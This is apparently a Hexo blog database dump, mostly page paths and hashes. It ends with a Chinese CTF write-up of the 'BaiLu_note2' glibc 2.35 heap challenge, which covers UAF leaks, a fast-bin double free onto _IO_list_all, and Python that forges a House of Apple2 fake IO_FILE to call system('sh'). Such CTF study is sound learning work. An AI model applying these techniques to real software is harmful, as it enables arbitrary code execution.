ified":1681041960365},{"_id":"public/archives/2023/03/index.html","hash":"f871cc3e5e89c02a6635ee78b404bfd8414477ed","modified":1681041960365},{"_id":"public/archives/2023/01/page/5/index.html","hash":"093bd68c0a7d53e1812adccd32c0c2b1a2c60357","modified":1681041960365},{"_id":"public/archives/2023/03/page/2/index.html","hash":"959d5dafde5154d69b6f2229ef87ee29e9c4ed4f","modified":1681041960365},{"_id":"public/archives/2023/03/page/3/index.html","hash":"83a7c54b7ba83fa712fe4061746108e383da9820","modified":1681041960365},{"_id":"public/archives/2023/04/index.html","hash":"35b1a0678bbade806326edb0de137482b965f7a1","modified":1681041960365},{"_id":"public/tags/pwn/index.html","hash":"9b3761761852f165101f9ac4670753ef19500e10","modified":1681041960365},{"_id":"public/tags/pwn/page/2/index.html","hash":"5e6c1968422fd4ebc33924028b1d035dab495b11","modified":1681041960365},{"_id":"public/tags/pwn/page/4/index.html","hash":"00ae99a0e12bcbfd05566472d1a84fbfb2843df3","modified":1681041960365},{"_id":"public/tags/pwn/page/3/index.html","hash":"977ffb034b8833f8587bfd429f935076bb2ee845","modified":1681041960365},{"_id":"public/tags/pwn/page/6/index.html","hash":"7f122e1a8db978adc46ccc2740a830c03cc29c91","modified":1681041960365},{"_id":"public/tags/pwn/page/5/index.html","hash":"db8138a344f92fc31cc5386e48b899d189e320c2","modified":1681041960365},{"_id":"public/tags/pwn/page/7/index.html","hash":"e391f6d32a83ece5431fd70414b8823dbb56c244","modified":1681041960365},{"_id":"public/tags/heap/index.html","hash":"2b391f4d0b6fa232d7dae2f653ac8e16aabadf48","modified":1681041960365},{"_id":"public/tags/heap/page/2/index.html","hash":"912bf26d90635aa1187a225e5f4e93500d507b4c","modified":1681041960365},{"_id":"public/tags/高版本glibc/index.html","hash":"5198234c62cf6c5f7afc2ad982aa247130dd33fe","modified":1681041960365},{"_id":"public/tags/heap/page/3/index.html","hash":"c77d29526e02a4052effdecf95d2effb82a70951","modified":1681041960365},{"_id":"public/tags/house-of-xxx/index.html","hash":"c4f85257d9f000bef117659f16dd5a71de4d6af7","modified":1681041960365},{"_id":"public/tags/House-of-xxx/index.html","hash":"40b7196a2485c954c1091b0b0113e2af2051f7a1","modified":1681041960365},{"_id":"public/tags/re/index.html","hash":"e38d7937d932f5c470a2cf0e0e3fabd11cc19057","modified":1681041960365},{"_id":"public/tags/arm/index.html","hash":"29f8480ed7ad40bb90835a29fead365c2df6ee52","modified":1681041960365},{"_id":"public/tags/c-s/index.html","hash":"575cfc16bb649d6b01543b59c3fbb8ba5da613c5","modified":1681041960365},{"_id":"public/tags/fuzzing/index.html","hash":"2ebe0d65f802180570623420e493ad899c422735","modified":1681041960365},{"_id":"public/tags/stackoverflow/index.html","hash":"ae2311f951eb591b48e572c97a1bc7cf54601caf","modified":1681041960365},{"_id":"public/tags/docker/index.html","hash":"652b65a16f732d02869cab6c697360d45e754c5f","modified":1681041960365},{"_id":"public/tags/stackoverflow/page/2/index.html","hash":"3ebbef41c53cd96ff134f5cc8dd6f1e1457a2390","modified":1681041960365},{"_id":"public/tags/misc/index.html","hash":"8b21c5926cc3a1f918794da57091f2a9bfb0151e","modified":1681041960365},{"_id":"public/tags/IO-FILE/index.html","hash":"0b9708af94d81468a4b548de133de1fdc44191dc","modified":1681041960365},{"_id":"public/tags/got-overwrite/index.html","hash":"4a3a816091059e2d3de1bcd0e9601e6e92386d97","modified":1681041960365},{"_id":"public/tags/linux/index.html","hash":"fd56d56dcabe4b48027b744e2c221bc2f8105d66","modified":1681041960365},{"_id":"public/tags/index-overflow/index.html","hash":"59d828187a399645dd34debb0901dfd1c167ed98","modified":1681041960365},{"_id":"public/tags/kernel/index.html","hash":"d01033d63c0fb9ad4416751673a9861cbb08abba","modified":1681041960365},{"_id":"public/tags/protocol/index.html","hash":"16fb2358beecf785ba427b22d455b2d141201678","modified":1681041960365},{"_id":"public/tags/matlab/index.html","hash":"ae5ee2a216b03dc79c6ca35a112ef11be85605d1","modified":1681041960365},{"_id":"public/tags/sandbox/index.html","hash":"da5c866d49c2af29402fc3ff1530522e2e63e1d5","modified":1681041960365},{"_id":"public/tags/ROP/index.html","hash":"6859b2d3f51aedaff85542cebf742cc4b09b91ee","modified":1681041960365},{"_id":"public/tags/数学建模/index.html","hash":"d4325f770946e036b25b655cc134d2c3f3909416","modified":1681041960365},{"_id":"public/tags/栈迁移/index.html","hash":"8734d7ce3ad070c8331de221deb618187a0c0f41","modified":1681041960365},{"_id":"public/tags/ROP/page/2/index.html","hash":"c1e2796b407ef04bfd396905b08ac29256fa221c","modified":1681041960365},{"_id":"public/tags/ret2usr/index.html","hash":"759dacee553c88822f17775ca71344606e6d50e5","modified":1681041960365},{"_id":"public/tags/rop/index.html","hash":"24ae928f595d13efffe781014d2b6740ee588d96","modified":1681041960365},{"_id":"public/tags/orw/index.html","hash":"5f8b13a8f2587eaa1a3964f2be74d5b73d5159cf","modified":1681041960365},{"_id":"public/tags/Misc/index.html","hash":"4f1d04f0cd88420b9b973a9a013aad3b3f4ae0e7","modified":1681041960365},{"_id":"public/tags/linux-trick/index.html","hash":"aa3a4f93501a4a50246f761cebbd35cd50d65db0","modified":1681041960365},{"_id":"public/tags/python/index.html","hash":"c296d34693aef6f22bcb41dcd813ac699c2b4602","modified":1681041960365},{"_id":"public/tags/race-condition/index.html","hash":"51d8011f5207d8be24b9f36b9271f6fc7e02fbfd","modified":1681041960365},{"_id":"public/tags/crypto/index.html","hash":"b1de100a00ea5cede0e938c884e69c0b9f96c5e7","modified":1681041960365},{"_id":"public/tags/format/index.html","hash":"35ccdfb569c56d980e803806db56016367dd55e7","modified":1681041960365},{"_id":"public/tags/musl/index.html","hash":"0eca1efbdf0db4302f941bb322df885f2af8d880","modified":1681041960365},{"_id":"public/tags/reverse/index.html","hash":"3d379cd6b5684668a96a628d1998deadeff86861","modified":1681041960365},{"_id":"public/tags/shellcode/index.html","hash":"e363692e298a6b2410738ed7a156ae1960b6f3b6","modified":1681041960365},{"_id":"public/tags/ret2dlsolve/index.html","hash":"35b35234649298759a4f2af9c281a5fc0e159451","modified":1681041960365},{"_id":"public/tags/SROP/index.html","hash":"6eeb3c01d9866f61f8cb4268ceae29d56ac799db","modified":1681041960365},{"_id":"public/tags/DFS/index.html","hash":"6781eace6ee9e011ede04907c734207891f8983a","modified":1681041960365},{"_id":"public/tags/asm/index.html","hash":"c888a002bb86d8dc6b499292d4cd2e8421d27131","modified":1681041960365},{"_id":"public/tags/setcontext/index.html","hash":"a7fc4873daedcf2e924b34e3a45b512a44e6ba3c","modified":1681041960365},{"_id":"public/categories/pwn-wp/index.html","hash":"0ac63d32bf83aa536f4137ab7abb89aaae7559ab","modified":1681041960365},{"_id":"public/categories/pwn-wp/page/2/index.html","hash":"371440715d7036dc987b5040bf430f16e8b7cf8a","modified":1681041960365},{"_id":"public/categories/pwn-wp/page/3/index.html","hash":"552b10aa1b0ef6afbdbe902c44755645e3c625f4","modified":1681041960365},{"_id":"public/categories/pwn-wp/page/4/index.html","hash":"2bb256bea05a99d17d6b082e974e5267f63d6b5e","modified":1681041960365},{"_id":"public/categories/pwn-wp/page/5/index.html","hash":"054d7c7898b048aa64b27d410c2aa63f821b0ffd","modified":1681041960365},{"_id":"public/categories/pwn-wp/page/6/index.html","hash":"f66dd001be2c141241a7e163c38bb87f992758b1","modified":1681041960365},{"_id":"public/categories/pwn/index.html","hash":"cf8ba387c221d7bd44ff25e4b6254d8b05aabca8","modified":1681041960365},{"_id":"public/categories/pwn/page/2/index.html","hash":"5788ef9184d2e4f51dfbba329feda0bcf14a976e","modified":1681041960365},{"_id":"public/categories/fuzzing/index.html","hash":"1dcd006177cc1433808f86a7312d9371eae9b4d1","modified":1681041960365},{"_id":"public/categories/linux/index.html","hash":"1eb65ba9d78936477cbe954d104e832fea1b27b6","modified":1681041960365},{"_id":"public/categories/数学建模/index.html","hash":"46ac90d897ebabd2c143ae094f903cad2a8aaca9","modified":1681041960365},{"_id":"public/categories/crypto/index.html","hash":"a3c7095a7a5c2469fb8b15ff44ad5fd0a7b042e3","modified":1681041960365},{"_id":"public/2023/04/03/Fuzzing/index.html","hash":"79a295fa51dcca081c350f89cd3d0dd212008754","modified":1681041960365},{"_id":"public/2023/03/29/nkctf_note/index.html","hash":"18a0e2a5302954ff1960710a9abedc2c115f4efb","modified":1681041960365},{"_id":"public/2023/03/26/nkctf_ByteDance/index.html","hash":"48ebbc8fd5c31d1aff3139716b349cfe5a9d67c4","modified":1681041960365},{"_id":"public/2023/03/26/nkctf_a_story_of_a_pwner/index.html","hash":"9f2a5f171da42e1b03fd816657dba30a22be8ce9","modified":1681041960365},{"_id":"public/2023/03/26/nkctf_babyheap/index.html","hash":"105e19ed348611e64b7d171d3a3c5aa2bac41535","modified":1681041960365},{"_id":"public/2023/03/26/nkctf_babyrop/index.html","hash":"6973ffef262a2036a004d5900a83c6d494d32200","modified":1681041960365},{"_id":"public/2023/03/26/nkctf_onlyread/index.html","hash":"d5c89cafc7681f64026af772f1c892fdbf50580a","modified":1681041960365},{"_id":"public/2023/03/26/nkctf_ezstack/index.html","hash":"a74a30480266f7cd96eecab82da203f44cecd7b6","modified":1681041960365},{"_id":"public/2023/03/26/nkctf_ezshellcode/index.html","hash":"0312abc1482798893f139c7e0c8fe8aa95efe246","modified":1681041960365},{"_id":"public/2023/03/26/musl_pwn/index.html","hash":"0f0c86ebc2b636b62115c5f8d16e0ef7bda43279","modified":1681041960365},{"_id":"public/2023/03/23/callme/index.html","hash":"922ff935315f8a0b782100bffd50b065a7722cd2","modified":1681041960365},{"_id":"public/2023/03/23/write4/index.html","hash":"275d18a0693124d4b0a2e795213bb5168b98badd","modified":1681041960365},{"_id":"public/2023/03/23/split/index.html","hash":"5fb6e6e9eee4cabcda0674fcb3c5e2324772b035","modified":1681041960365},{"_id":"public/2023/03/23/ret2win_asmv5/index.html","hash":"834727abf35bb7c8fa6e9c8a94442adf7239c720","modified":1681041960365},{"_id":"public/2023/03/23/typo/index.html","hash":"9205c0febc6d1a5dffb9b72324c170793c3bbb60","modified":1681041960365},{"_id":"public/2023/03/21/MTCTF-smtp/index.html","hash":"63e50af5074e1eeba82339dc39fb9e62390de5cd","modified":1681041960365},{"_id":"public/2023/03/19/NewStar-orw_me_plz/index.html","hash":"51198986224cd10c85c93b8731d3fd046eb84756","modified":1681041960365},{"_id":"public/2023/03/19/NewStar-leak_me_plz/index.html","hash":"9832fae468d2b38095405750716608ea662f633b","modified":1681041960365},{"_id":"public/2023/03/19/NewStar-overflow_me_plz/index.html","hash":"3d290fe6ec908d314ba7e5fcf9beec3060f9109c","modified":1681041960365},{"_id":"public/2023/03/19/NewStar-code_me_plz/index.html","hash":"aa99d8fa6eea670c81b3671f70e656c147ab9f48","modified":1681041960365},{"_id":"public/2023/03/16/hashlib/index.html","hash":"d77bdca58392920b6be20e17a5289f75a582b9ad","modified":1681041960365},{"_id":"public/2023/03/14/QWB-core/index.html","hash":"5e3cc3cdd581f6697dd92246118b001b1316b20b","modified":1681041960365},{"_id":"public/2023/03/12/pwnhub_sh_v1.1/index.html","hash":"ecf0b656bc93de5be3b757205ddac475a4e5da67","modified":1681041960365},{"_id":"public/2023/03/01/XHLJ-MessageBoard/index.html","hash":"2e17da75365c262ef3db9c784b56047dfcadecd7","modified":1681041960365},{"_id":"public/2023/03/01/XHLJ-babycalc/index.html","hash":"8a012fcc5121a8aa2a0a5eb9dedc63d5d3b4c4f9","modified":1681041960365},{"_id":"public/2023/03/08/BaiLu-note2/index.html","hash":"81a617a26540ddc4497c8e500ee0a9ed850842ec","modified":1681041960365},{"_id":"public/2023/01/13/setcontext/index.html","hash":"6959f7e0b793bde3cd0982d14009043f3c5f76f3","modified":1681041960365},{"_id":"public/2023/01/10/铁人三项heap2019/index.html","hash":"c42110ad225d3848d3096303d2a88f91f1337106","modified":1681041960365},{"_id":"public/2023/01/02/IsThisHeap2/index.html","hash":"f92bb6d098eb35edba4b1d7b4a3876df65c605b6","modified":1681041960365},{"_id":"public/2023/01/07/ArmPwn/index.html","hash":"be224f91b90b7642663fbf2419974cae35683054","modified":1681041960365},{"_id":"public/2023/01/02/0ctf_2018_heapstorm2/index.html","hash":"09efa9d0222e7248b8f0a30a7130510a83cc6ca0","modified":1681041960365},{"_id":"public/2023/01/02/BaiLu_note1/index.html","hash":"7098689ddc865849fa94600dd7314f393e10fc2b","modified":1681041960365},{"_id":"public/2023/01/02/IsThisHeap/index.html","hash":"c24730d6ab1ffefe65df08452282b02acdb22d30","modified":1681041960365},{"_id":"public/2023/01/02/Matlab/index.html","hash":"a05169e84c8ec243ed8fb61e33ba2d381fab2d04","modified":1681041960365},{"_id":"public/2023/01/02/Read&Write/index.html","hash":"1069783d1ac5ebdf5a74f5394c60dcdf5c60e042","modified":1681041960365},{"_id":"public/2023/01/02/babyfengshui/index.html","hash":"d727e32b93cfcc7957af43edf59731e1c6e5f000","modified":1681041960365},{"_id":"public/2023/01/02/bcloud/index.html","hash":"dfcc634e5da724faf6e5c0af46e9e4a1de00022e","modified":1681041960365},{"_id":"public/2023/01/02/buffer_fly/index.html","hash":"dbd5d5483f900cd6ad1004e63451144f377625b0","modified":1681041960365},{"_id":"public/2023/01/02/ciscn_2019_n_3/index.html","hash":"15a4ed0ab4a02edb9474c7ff1a55c5c0528e5e43","modified":1681041960365},{"_id":"public/2023/01/02/cat_flag/index.html","hash":"a6fd2a21d9a607dfe722a8a2886f75002d123060","modified":1681041960365},{"_id":"public/2023/01/02/ez_linklist/index.html","hash":"0fc783b70b902f4399f44c577aed99d324317b24","modified":1681041960365},{"_id":"public/2023/01/02/mt_note/index.html","hash":"75dc7ef084c418c1d457cdb5cef399b93b9715fb","modified":1681041960365},{"_id":"public/2023/01/02/hide/index.html","hash":"80050e29c08f16a1e76abf6dc3afd35f8ce2d2ba","modified":1681041960365},{"_id":"public/2023/01/02/houseoforangeHitcon2016/index.html","hash":"1c5ee9e298323454134ce4940cb9c773cd536a75","modified":1681041960365},{"_id":"public/2023/01/02/oreo/index.html","hash":"72d59cccfb032a3814ef91f7512e2a603de7da05","modified":1681041960365},{"_id":"public/2023/01/02/magicheap/index.html","hash":"da80f25541a070d56c04af087b5411ad01366c6a","modified":1681041960365},{"_id":"public/2023/01/02/pwnable_start/index.html","hash":"e57943558bbf58d0dc521c7d168cbcc0659115a1","modified":1681041960365},{"_id":"public/2023/01/02/ret2csu1/index.html","hash":"d3ecdb56b7d2d96e84906866a10f37dc5b0fc72e","modified":1681041960365},{"_id":"public/2023/01/02/sheep_a_flag/index.html","hash":"9839c193b3e7987a395e533d46fbf7da516db546","modified":1681041960365},{"_id":"public/2023/01/02/tinypad/index.html","hash":"af2ee19528b26968a2e5553d8b12dd548edab502","modified":1681041960365},{"_id":"public/2023/01/02/shellcode_revenge/index.html","hash":"5a2179356f5a7cc87a41f46541e312939c1234f6","modified":1681041960365},{"_id":"public/2023/01/02/Docker/index.html","hash":"fda692baa45ec5eb1ee311aec31ddb1dbc9d36a7","modified":1681041960365},{"_id":"public/2023/01/02/time_formatter/index.html","hash":"e9515f0f471accac7a31c8dba8bf5617d4c57cfa","modified":1681041960365},{"_id":"public/2023/01/02/ISCC_game/index.html","hash":"99f04912da0706dffa1a81874dd8a75f66cdc423","modified":1681041960365},{"_id":"public/2023/01/02/IO_FILE/index.html","hash":"b4e3b9fa63c835f95f1fccf88ec3342aa0559546","modified":1681041960365},{"_id":"public/2023/01/02/House Of XXX/index.html","hash":"4d1fecac223d98e05270c22b87893a3ca3c70651","modified":1681041960365},{"_id":"public/2023/01/02/Kernel_Basic_Knowledge/index.html","hash":"37eae7fff7555a7a2b83566dd7160f455cf67c22","modified":1681041960365},{"_id":"public/2023/01/02/sandbox/index.html","hash":"36823d70e60dd29736cbb24de902bf1d9f284d73","modified":1681041960365},{"_id":"public/2023/01/02/Misc/index.html","hash":"b5b0f2d32640f6fc12de16586577bf33d8de6100","modified":1681041960365},{"_id":"public/2023/01/02/heap_operation/index.html","hash":"84da63f84336fb20f1662fbe4d1d7ad28ee9e70e","modified":1681041960365},{"_id":"public/2023/01/02/heap struct/index.html","hash":"c3c8b3164cbc3a0641ca7021c216fc1fd7c08cb5","modified":1681041960365},{"_id":"public/2023/01/02/heap_attack/index.html","hash":"0f4a243be10baf0e747359d7aa651efe967d0617","modified":1681041960365},{"_id":"public/2023/01/02/stack_overflow/index.html","hash":"10403639c8823f16d37cccabf91e2b7d6d1052fa","modified":1681041960365},{"_id":"public/2023/01/02/ROP/index.html","hash":"f2efac1792287204764ec7500f9252ecec0b9c50","modified":1681041960365},{"_id":"public/index.html","hash":"f08428e3992adeeda4be44be60bc720c1a9e3150","modified":1681041960365},{"_id":"public/page/2/index.html","hash":"dfc26cfd0a45c9e1d0f1dcf2e510717967cd0369","modified":1681041960365},{"_id":"public/page/3/index.html","hash":"38c21f1c501173a186aaa59e31c7140b827924c5","modified":1681041960365},{"_id":"public/page/4/index.html","hash":"6f7f4201cfc8ab0565c8c00d849fe5f7d528725e","modified":1681041960365},{"_id":"public/page/5/index.html","hash":"bb7cf62bb303dae0026cb3a72ce4c1138b568dde","modified":1681041960365},{"_id":"public/page/6/index.html","hash":"7492805f4dab9667aec311d903bd950536a2a122","modified":1681041960365},{"_id":"public/page/7/index.html","hash":"8586f59de88f11234c77caf319dab5c55778ef81","modified":1681041960365},{"_id":"public/page/8/index.html","hash":"9e0d8f15fac0f3991fe3c1dd0f045cb21718b9d4","modified":1681041960365},{"_id":"public/images/algolia_logo.svg","hash":"45eeea0b5fba833e21e38ea10ed5ab385ceb4f01","modified":1681041960365},{"_id":"public/images/avatar.jpg","hash":"7b16ee1764b0db6c11eb0f88da7cc2adf8a24d14","modified":1681041960365},{"_id":"public/images/apple-touch-icon-next.png","hash":"2959dbc97f31c80283e67104fe0854e2369e40aa","modified":1681041960365},{"_id":"public/images/cc-by-nc-nd.svg","hash":"bc3588c9b2d7c68830524783120ff6cf957cf668","modified":1681041960365},{"_id":"public/images/cc-by-nc.svg","hash":"6f076713fb9bf934aa2c1046bdf2cf2e37bc1eab","modified":1681041960365},{"_id":"public/images/cc-by-sa.svg","hash":"70c1535f43e54e5ff35ca81419e77e4c0c301398","modified":1681041960365},{"_id":"public/images/cc-by-nc-sa.svg","hash":"6f55543d1fb9cbc436c101d24f802dec7b41efc3","modified":1681041960365},{"_id":"public/images/cc-by-nd.svg","hash":"42cd73da328077ccc92f859bb8f3cf621b3484f8","modified":1681041960365},{"_id":"public/images/cc-by.svg","hash":"e92a33c32d1dac8ed94849b2b4e6456e887efe70","modified":1681041960365},{"_id":"public/images/cc-zero.svg","hash":"9bfb52b2f63527a7049247bf00d44e6dc1170e7d","modified":1681041960365},{"_id":"public/images/favicon-16x16-next.png","hash":"943a0d67a9cdf8c198109b28f9dbd42f761d11c3","modified":1681041960365},{"_id":"public/images/logo.svg","hash":"169f56fd82941591dad3abd734a50ec7259be950","modified":1681041960365},{"_id":"public/images/favicon-32x32-next.png","hash":"0749d7b24b0d2fae1c8eb7f671ad4646ee1894b1","modified":1681041960365},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"260bb01acd44d88dcb7f501a238ab968f86bef9e","modified":1681041960365},{"_id":"public/2023/01/02/Misc/kernelpwn.h","hash":"d8192c6d48ad3f0f39b61f59f8518f3edbfb7a2e","modified":1681041960365},{"_id":"public/2023/01/02/bcloud/get_input.jpg","hash":"757a1fd828747700588f42ee99a8111387f6d7af","modified":1681041960365},{"_id":"public/2023/01/02/bcloud/org_host.jpg","hash":"6a1e993f86ecca9137cae0787d3a47823c6ad761","modified":1681041960365},{"_id":"public/2023/01/02/bcloud/input_name.jpg","hash":"1ab2ccfd4d20d6cfc676f0550424647bc60fbcc1","modified":1681041960365},{"_id":"public/2023/01/02/stack_overflow/stack2.png","hash":"772412fe866f5c8f4800e3fa6197a9308e5821c2","modified":1681041960365},{"_id":"public/2023/01/02/oreo/fake.jpg","hash":"ad13e49981fdcd9307eef025ed9bd13250405a19","modified":1681041960365},{"_id":"public/2023/01/02/shellcode_revenge/ida.jpg","hash":"e4ad1f19022e55119f0b69083cd0de3f5ac69525","modified":1681041960365},{"_id":"public/2023/01/02/tinypad/hoe.jpg","hash":"ea919b3713bd65046b5558fa20f0bc8aef780798","modified":1681041960365},{"_id":"public/2023/01/02/time_formatter/protect.png","hash":"17b40dfe2734ffbdc142762b0f8e78e8c667aac0","modified":1681041960365},{"_id":"public/2023/01/10/铁人三项heap2019/1673449093269-1.png","hash":"a7b05f9b82108d55aed1cd7243eb11909154e200","modified":1681041960365},{"_id":"public/2023/01/02/Kernel_Basic_Knowledge/2W8xIfwqm9Y7Fru.png","hash":"2e811dfb6c8940e7563146662038683fa96c7a4f","modified":1681041960365},{"_id":"public/2023/01/02/Kernel_Basic_Knowledge/image-20230115125518678.png","hash":"8fdd501d1e1a4b9f4b6efd6738b7a7bb6630171c","modified":1681041960365},{"_id":"public/2023/01/02/Kernel_Basic_Knowledge/MjWZmba9SLH1xIO.png","hash":"7f45bddd823c3f236e3323228dfed206a8f69fd6","modified":1681041960365},{"_id":"public/2023/01/02/Kernel_Basic_Knowledge/sOwdI5YMNUjLSib-1678172668801-7.png","hash":"b82ec3254e3cc6678dc620d0745d6e50e76cffdf","modified":1681041960365},{"_id":"public/2023/01/02/Kernel_Basic_Knowledge/sOwdI5YMNUjLSib.png","hash":"b82ec3254e3cc6678dc620d0745d6e50e76cffdf","modified":1681041960365},{"_id":"public/2023/01/02/Kernel_Basic_Knowledge/wLzFuCB5n1DAIY7.png","hash":"aab9f160a4664cc0460263d0fc48c546adc6e99e","modified":1681041960365},{"_id":"public/2023/01/02/heap_attack/FastbinDoubleFree.png","hash":"cfe092c2d8bc3add3c019e91cd4e16f62ce31dbf","modified":1681041960365},{"_id":"public/2023/01/02/Kernel_Basic_Knowledge/ciscn_2019_n_3/check.png","hash":"88d2df490e41beb6d3b4bedf856d7415c22e0565","modified":1681041960365},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"509988477da79c146cb93fb728405f18e923c2de","modified":1681041960365},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"75a88815c47a249eadb5f0edc1675957f860cca7","modified":1681041960365},{"_id":"public/2023/01/02/ROP/plt_and_got.jpg","hash":"119d44e139e5bdabab36b57b3409d8bc009c1a54","modified":1681041960365},{"_id":"public/2023/01/02/Kernel_Basic_Knowledge/ivPnbsjHyI94m5z.png","hash":"0158d08093eca859078fcab91125fc0390a28519","modified":1681041960365},{"_id":"public/js/algolia-search.js","hash":"498d233eb5c7af6940baf94c1a1c36fdf1dd2636","modified":1681041960365},{"_id":"public/js/local-search.js","hash":"35ccf100d8f9c0fd6bfbb7fa88c2a76c42a69110","modified":1681041960365},{"_id":"public/js/bookmark.js","hash":"9734ebcb9b83489686f5c2da67dc9e6157e988ad","modified":1681041960365},{"_id":"public/js/next-boot.js","hash":"a1b0636423009d4a4e4cea97bcbf1842bfab582c","modified":1681041960365},{"_id":"public/js/motion.js","hash":"72df86f6dfa29cce22abeff9d814c9dddfcf13a9","modified":1681041960365},{"_id":"public/js/utils.js","hash":"730cca7f164eaf258661a61ff3f769851ff1e5da","modified":1681041960365},{"_id":"public/lib/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1681041960365},{"_id":"public/js/schemes/pisces.js","hash":"0ac5ce155bc58c972fe21c4c447f85e6f8755c62","modified":1681041960365},{"_id":"public/js/schemes/muse.js","hash":"1eb9b88103ddcf8827b1a7cbc56471a9c5592d53","modified":1681041960365},{"_id":"public/css/main.css","hash":"7d124c04c41eb6e4800b5d254e1d6a5b58d070d8","modified":1681041960365},{"_id":"public/lib/anime.min.js","hash":"47cb482a8a488620a793d50ba8f6752324b46af3","modified":1681041960365},{"_id":"public/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1681041960365},{"_id":"public/lib/font-awesome/css/all.min.css","hash":"0038dc97c79451578b7bd48af60ba62282b4082b","modified":1681041960365},{"_id":"public/2023/01/07/ArmPwn/arm32register","hash":"78096d3e59f3d8470ab51c23951e5e293b645879","modified":1681041960365},{"_id":"public/2023/01/02/stack_overflow/stack.png","hash":"c129a6e871db49924adb207e17d7b9500e5e2e8c","modified":1681041960365},{"_id":"public/2023/01/02/Kernel_Basic_Knowledge/image-20230115130938230.png","hash":"1e6bc25b3438740912a384b8e2b60fa7b6d33b61","modified":1681041960365}],"Category":[{"name":"pwn_wp","_id":"clg9czaet00045oudebln8bqy"},{"name":"pwn","_id":"clg9czaf2000f5oud2c9iaut5"},{"name":"fuzzing","_id":"clg9czaf7000r5oud5e4u6wuf"},{"name":"linux","_id":"clg9czafb00135oud7pck92v8"},{"name":"数学建模","_id":"clg9czafe001g5oud31vu4nc2"},{"name":"crypto","_id":"clg9czafy003n5oud4k0rcilq"}],"Data":[],"Page":[{"title":"categories","date":"2023-01-02T11:24:24.000Z","type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2023-01-02 19:24:24\ntype: categories\n---\n","updated":"2023-01-02T12:46:12.000Z","path":"categories/index.html","comments":1,"layout":"page","_id":"clg9czaej00005oudaosn6ip3","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"归档","date":"2023-01-02T11:29:30.000Z","type":"archives","_content":"","source":"archives/index.md","raw":"---\ntitle: 归档\ndate: 2023-01-02 19:29:30\ntype: archives\n---\n","updated":"2023-01-02T12:28:18.000Z","path":"archives/index.html","comments":1,"layout":"page","_id":"clg9czaer00025oudd4tx11rm","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"tags","date":"2023-01-02T11:23:39.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2023-01-02 19:23:39\ntype: tags\n---\n","updated":"2023-01-02T12:45:46.000Z","path":"tags/index.html","comments":1,"layout":"page","_id":"clg9czaev00065oudgoi1dbvp","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"BaiLu_note2","date":"2023-03-08T11:28:27.000Z","_content":"\n柏鹭杯的note2，用的glibc2.35。\n\n高版本的 glibc 封锁掉了很多的后门，特别是几个重要的 hook 不再是我们可以利用的了。这些高版本的glibc利用往往涉及到io(House of ...)，而且不少都与large bin有关系，但这里走的是fast bin和tcache。\n\n<!--more-->\n\n堆题经典保护全开。glibc2.35的ld文件用的是ld-linux-x86-64.so.2而不是ld-2.35.so\n\n```sh\npatchelf --set-interpreter /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so --set-rpath /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ filename\n\n# 高版本libc用ld-linux-x86-64.so.2，除此之外还要\nsudo cp -r /home/a1ph0nse/tools/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/.debug/.build-id/* /usr/lib/debug/.build-id/\n```\n\n这也是一个菜单，有增删查的功能；最多同时申请10个chunk，chunk的size<=0x200（small bin）；在删除的时候没有清空指针，存在UAF；查是简单的puts()；程序退出的时候走的是exit(0)。\n\n可以通过UAF+查leak libc，通过fast bin double free劫持_IO_list_all，之后走House of Apple2的利用链。\n\n### leak libc and heap base\n\n利用unsorted bin和UAF来leak libc\n\nheap base可以通过让两个chunk在unsorted bin中利用UAF来leak\n\nheap base也可以利用**glibc2.32引入tcache的safe-linking（异或加密）机制**来leak，该操作在chunk被放入tcache bin和从tcache bin中取出时进行，会对**存放在`fd`处的指针**进行处理。\n\n```c\n#define PROTECT_PTR(pos, ptr, type)  \\\n        ((type)((((size_t)pos) >> PAGE_SHIFT) ^ ((size_t)ptr)))\n#define REVEAL_PTR(pos, ptr, type)   \\\n        PROTECT_PTR(pos, ptr, type)\n```\n\n实际上就是执行`ptr^(heap_base>>12)`。因此第一个放入tcache的chunk中的fd=(0^(heap_base>>12))==(heap_base>>12)，因此只要读出其中的值，并左移12位即可得到heap_base。\n\n```py\nkey=uu64(r(5)) # heap_base长6字节,最后12位为0,右移12位后,接受5字节即可获得高36bit和额外的4bit\nheap_base=key<<12 # 此时左移12bit即可得到heap_base\n```\n\n### djack _IO_list_all\n\n这里要利用UAF控制unsorted bin或small bin并不容易，最方便的还是利用fast bin double free实现overlap，修改fd指向`_IO_list_all`，并且由于使用tcache，在tcache为空的情况下会先从fast bin放入tcache，再从tcache中取出，不会对`size`字段进行检查，因此不用调整偏移满足`size`字段。\n\n### House of Apple2\n\n伪造`IO_FILE`，利用House of Apple2，走`exit->fcloseall->_IO_cleanup->_IO_flush_all_lockp->_IO_wfile_overflow(_IO_wfile_jumps中的_IO_overflow)->_IO_wdoallocbuf->_IO_WDOALLOCATE->*(fp->_wide_data->_wide_vtable + 0x68)(fp)`\n\n```py\n# construct fake io\ntarget_addr=heapbase+0xfc0\n\nfake_fp=b'  sh' # flag <-target \nfake_fp=fake_fp.ljust(0x28,b'\\x00')+p64(1) # write_ptr > write_base\nfake_fp=fake_fp.ljust(0xa0,b'\\x00')+p64(target_addr+0xe0) # ->wide_data\nfake_fp=fake_fp.ljust(0xd8,b'\\x00')+p64(_IO_wfile_jumps) # mode<=0 ->vtable\nfake_fp=fake_fp.ljust(0xe0+0xe0,b'\\x00')+p64(target_addr+0x210) # ->wide_data->vtable\n\nfake_wide=b'\\x00'\nfake_wide=fake_wide.ljust(0x68,b'\\x00')+p64(sys_addr) # fp->_wide_data->_wide_vtable + 0x68=RIP\n\n\nadd(1,0x200,fake_fp) # +0xfc0\nadd(2,0x200,fake_wide) # +0x11c0\n```\n\n### exp\n\nexp:\n\n```py\nfrom pwn 